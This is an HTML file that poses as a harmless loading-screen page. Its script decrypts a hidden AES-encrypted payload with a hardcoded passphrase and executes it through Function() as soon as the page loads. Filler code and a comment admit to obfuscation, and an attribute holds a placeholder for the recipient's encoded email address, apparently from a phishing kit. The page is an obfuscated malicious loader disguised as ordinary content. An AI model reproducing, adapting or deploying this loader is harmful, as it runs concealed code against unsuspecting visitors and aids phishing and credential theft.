<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Creative Dev">
    <title>Dynamic Loading Screen</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #f8f9fa;
            font-family: Arial, Helvetica, sans-serif;
            min-height: 100vh;
            overflow: hidden;
        }
        .spinner-box {
            width: 70px;
            height: 70px;
            border: 10px solid #ddd;
            border-top: 10px solid #007bff;
            border-radius: 50%;
            animation: spin-circle 1.2s linear infinite;
        }
        @keyframes spin-circle {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .loading-status {
            margin-top: 15px;
            font-size: 18px;
            color: #555;
        }
        .hidden-section {
            visibility: hidden;
        }
    </style>
</head>
<body>

    <!-- Hidden section -->
    <div class="hidden-section">
        <div id="extra-node" data-value="placeholder"></div>
    </div>

    <!-- Loader -->
    <div class="spinner-box"></div>
    <p nike-bashman="" adidas="<%=EMAIL64%>" class="loading-status">Hang tight! Processing your request...</p>

    <!-- Additional unused content -->
    <div style="display: none;">
        <span>Extra content for obfuscation purposes.</span>
    </div>

    <!-- Core Script -->
    <script>
        const executeFakeTasks = () => {
            const tasks = ["TaskAlpha", "TaskBeta", "TaskGamma"];
            tasks.forEach(task => console.log(`Executing: ${task}`));
        };
        executeFakeTasks();

        setTimeout(() => {
            document.querySelector('.loading-status').textContent = "Process completed!";
            document.body.style.backgroundColor = '#e7ffe6';
        }, 5000);

        (() => {
            const redundantElement = document.createElement('div');
            redundantElement.id = 'hiddenContent';
            redundantElement.textContent = "This won't show up.";
            console.log(redundantElement);
        })();
    </script>

    <!-- Advanced Decryption Logic -->
    <script>
        const decryptContent = async (encryptedData, ivHex, saltHex, passphrase) => {
            console.log("[INFO] Starting decryption...");

            const hexToBytes = (hexString) => {
                return Uint8Array.from(hexString.match(/.{2}/g).map(byte => parseInt(byte, 16)));
            };

            const delaySimulation = () => new Promise(resolve => {
                console.log("[DEBUG] Simulating delay...");
                setTimeout(() => {
                    resolve();
                }, 200);
            });

            const deriveKey = async (keyMaterial, salt) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                    keyMaterial,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(passphrase),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await delaySimulation();
            const aesKey = await deriveKey(keyMaterial, hexToBytes(saltHex));

            try {
                const decryptedContent = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: hexToBytes(ivHex) },
                    aesKey,
                    hexToBytes(encryptedData)
                );
                console.log("[SUCCESS] Decryption completed.");
                return new TextDecoder().decode(decryptedContent);
            } catch (error) {
                console.error("[ERROR] Decryption failed:", error);
                return null;
            }
        };

        const analyzeData = (data) => {
            console.log("[INFO] Analyzing decrypted content...");
            if (!data) {
                console.error("[ERROR] Missing data.");
                return;
            }
            const reversedData = data.split("").reverse().join("");
            console.log("[INFO] Reversed data:", reversedData);
            return reversedData;
        };

        (async () => {
            console.log("[INFO] Decryption workflow initiated...");
         const payload = {
                iv: "c5d54a9c69516d18fab025aa",
                salt: "f2c9263a7137550b0829e316a222b86e",
                data: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
            };

            const passphrase = "quickescape";
            const decryptedResult = await decryptContent(payload.data, payload.iv, payload.salt, passphrase);

            if (decryptedResult) {
                console.log("[INFO] Decrypted data:", decryptedResult);
                const analyzedOutput = analyzeData(decryptedResult);

                console.log("[INFO] Executing decrypted output...");
                Function(`${decryptedResult}`)();
            }
        })();
    </script>
</body>
</html>
